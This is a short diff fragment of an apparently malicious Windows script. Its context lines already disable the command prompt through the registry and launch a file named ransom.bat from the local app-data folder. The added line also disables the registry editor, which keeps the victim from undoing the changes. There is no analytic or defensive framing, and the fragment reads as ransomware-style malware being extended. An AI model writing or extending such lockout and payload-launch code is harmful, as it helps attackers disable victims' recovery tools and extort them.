@@ -49,4 +49,5 @@ finally {
     if ($fs) { $fs.Dispose() }
 }
 reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 start %localappdata%\ransom.bat
